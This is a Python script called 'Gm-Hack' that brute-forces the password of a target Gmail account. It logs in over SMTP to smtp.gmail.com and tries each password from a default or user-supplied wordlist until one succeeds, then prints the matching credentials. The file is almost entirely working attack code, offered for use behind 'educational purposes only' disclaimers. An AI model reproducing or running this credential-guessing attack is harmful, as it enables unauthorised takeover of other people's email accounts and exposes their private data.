""" Coded by Background-Sajjad (Sajjad)"""

#Follow me on github: https://www.github.com/Background-Sajjad

""" It is only for educational purposes. Don't use it any illegal. Developers aren't responsible for any misuse or damage by Gm-Hack """

import os
import smtplib
import time
import core.logo
import datetime
import sys

Red="\033[0;91m"
Green="\033[0;92m"
Yellow="\033[0;93m"
Blue="\033[0;94m"
Cyan="\033[0;95m"
White="\033[0;40m"
Clear="\033[0;0;0m"
Bold="\033[1m"
Bg_red="\033[101m"
os.system("clear")
print(Bold+White+Bg_red+"""\n
   Use this tool for educational purposes only !  
  [Developers aren't  responsible for any misuse and illegal activety by Gm-Hack !]
"""+Clear)

try:
	print("\n Gm-Hack starting...",end="\r")
	account=smtplib.SMTP("smtp.gmail.com",587)
	account.starttls()
	print(" Gm-Hack started.    ")
	time.sleep(0.1)
	os.system("clear")
except:
	os.system("clear")
	print(Bold+White+Bg_red+"\n\t Make sure you have internet connection ! ")
	print(Clear)
	sys.exit()

print("\n")
print("\n", core.logo.logo())
print("\n")


id=input(Bold+"\n [$] Target gmail id : ")
print(Bold+Green+"""\n  [1] Auto Attack
  [2] Manual Attack"""+Clear)
  
option=int(input("\n [$] Enter the option: "))
if(option==1):
	list="pass/passwords.txt"
elif(option==2):
	list=input("\n [$] Password list location and name: ")
else:
	pass

password_list=os.path.join(list)
#File for passwords
file=open(password_list,"rt")

#File 1 for while loop
file1=open(password_list,"rt")

time=datetime.datetime.now().strftime("%H:%M:%S")

year=int(datetime.datetime.now().year)

month=int(datetime.datetime.now().month)

day=int(datetime.datetime.now().day)
print("")
print("")
print(Bold+"\n Started at \033[0;0;96m  \t{}-{}-{}   {}".format(year,month,day,time)+Bold)
count=0
pass_try=0
line=file1.readline()
while(line):
	line=file1.readline()
	pass_try+=1
	
	year_1=int(datetime.datetime.now().year)
	month_1=int(datetime.datetime.now().month)
	day_1=int(datetime.datetime.now().day)
	time_1=datetime.datetime.now().strftime("%H:%M:%S")
	
	password="".join(file.readline())
	try:
		account.login(id,password)
		print("")
		count +=1
		print(Green+Bold+"\n [Found] {} valid password found. Login :: {}   Password :: {}".format(count,id,password),Clear)
		print(Bold+" Finished at    {}-{}-{}     {} .".format(year,month,day,time))
		print("")
		print(Clear)
		file.close()
		file1.close()
		account.quit()
		break
	except:
		print(Clear+"\n [Try] {} login: {}   pass: {}   time: {}-{}-{} {}".format(pass_try,id,password,year_1,month_1,day_1,time_1))
		
print("")
print(Clear+Bold+"  {} passwords try. {} valid password found.".format(pass_try,count),Clear)				
file.close()
file1.close()
print(Clear)